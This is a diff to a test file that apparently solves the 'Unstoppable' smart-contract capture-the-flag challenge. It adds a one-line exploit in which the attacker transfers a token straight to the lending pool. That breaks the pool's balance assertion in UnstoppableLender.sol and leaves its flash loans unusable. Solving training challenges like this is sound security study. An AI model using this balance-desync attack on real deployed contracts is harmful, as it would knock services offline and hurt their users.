@@ -39,7 +39,12 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        /** EXPLOIT -- SOLVED */
+        /** 
+         * targetting vulnerability in UnstoppableLender.sol,
+         * line 40 -> "assert(poolBalance == balanceBefore)"
+         * */
+        this.token.connect(attacker).transfer(this.pool.address, ethers.utils.parseEther('1'));
     });
 
     after(async function () {
